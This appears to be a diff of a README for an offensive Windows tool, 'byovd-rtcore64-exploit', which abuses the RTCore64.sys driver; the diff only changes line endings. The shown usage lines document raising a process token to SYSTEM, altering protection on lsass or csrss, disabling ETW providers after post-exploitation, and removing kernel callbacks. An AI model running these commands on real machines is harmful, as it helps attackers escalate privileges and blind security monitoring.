@@ -4,32 +4,32 @@ Capabilities not limited to elevating the target process' token similar to SYSTE
 > This operation requires LOCAL admin privileges.
 
 ## Arguments
-`<actions>` : choose on the following - unrestricttoken | setintegritylevel | settokenhighprivs | elevate2system | flipprocprotection | etwdisable | callbacks
-`<targetPid>` : the target PID to modify the token configuration.
-`<prot_type>` : When flipping the process protection , choose whether to flip to Process Protection Light or Process Protection.
-`<etwListTxt>` : A text file containing the ETW Providers to disable based on a specific operation executed after this.
-`<pers>` : status whether the service will persist or not.
+`<actions>` : choose on the following - unrestricttoken | setintegritylevel | settokenhighprivs | elevate2system | flipprocprotection | etwdisable | callbacks  
+`<targetPid>` : the target PID to modify the token configuration.  
+`<prot_type>` : When flipping the process protection , choose whether to flip to Process Protection Light or Process Protection.  
+`<etwListTxt>` : A text file containing the ETW Providers to disable based on a specific operation executed after this.  
+`<pers>` : status whether the service will persist or not.  
 
 ## Usage - How to not use a param? How to use different param on a different obj
-* `byovd-rtcore64-exploit elevate2system 8917 TRUE`
-* `byovd-rtcore64-exploit settokenhighprivs 614 FALSE`
-* `byovd-rtcore64-exploit setintegritylevel 7957 TRUE`
-* `byovd-rtcore64-exploit unrestricttoken 2543 TRUE`
+* `byovd-rtcore64-exploit elevate2system 8917 TRUE`  
+* `byovd-rtcore64-exploit settokenhighprivs 614 FALSE`  
+* `byovd-rtcore64-exploit setintegritylevel 7957 TRUE`  
+* `byovd-rtcore64-exploit unrestricttoken 2543 TRUE`  
 
-// ====================== Ignore these for now ==================
-* `byovd-rtcore64-exploit flipprocprotection <lsass|csrss>.exe ppl FALSE`
-* `byovd-rtcore64-exploit flipprocprotection <lsass|csrss>.exe pp TRUE`
-* `byovd-rtcore64-exploit etwdisable providerListDisable.txt FALSE` ## the list.txt file contains the Providers after Post-Ex enum 
-* `byovd-rtcore64-exploit callback list object FALSE`
-* `byovd-rtcore64-exploit callback list process FALSE`
-* `byovd-rtcore64-exploit callback list thread FALSE`
-* `byovd-rtcore64-exploit callback list registry FALSE`
-* `byovd-rtcore64-exploit callback remove registry RTCore64.sys TRUE`
-* `byovd-rtcore64-exploit callback remove thread RTCore64.sys TRUE`
-// =================================================================
+// ====================== Ignore these for now ==================  
+* `byovd-rtcore64-exploit flipprocprotection <lsass|csrss>.exe ppl FALSE`  
+* `byovd-rtcore64-exploit flipprocprotection <lsass|csrss>.exe pp TRUE`  
+* `byovd-rtcore64-exploit etwdisable providerListDisable.txt FALSE` ## the list.txt file contains the Providers after Post-Ex enum   
+* `byovd-rtcore64-exploit callback list object FALSE`  
+* `byovd-rtcore64-exploit callback list process FALSE`  
+* `byovd-rtcore64-exploit callback list thread FALSE`  
+* `byovd-rtcore64-exploit callback list registry FALSE`  
+* `byovd-rtcore64-exploit callback remove registry RTCore64.sys TRUE`  
+* `byovd-rtcore64-exploit callback remove thread RTCore64.sys TRUE`  
+// =================================================================  
 
 ## Example
-* `byovd-rtcore64-exploit`
+* `byovd-rtcore64-exploit`  
 
 ## Questions:
 * Why use this technique?
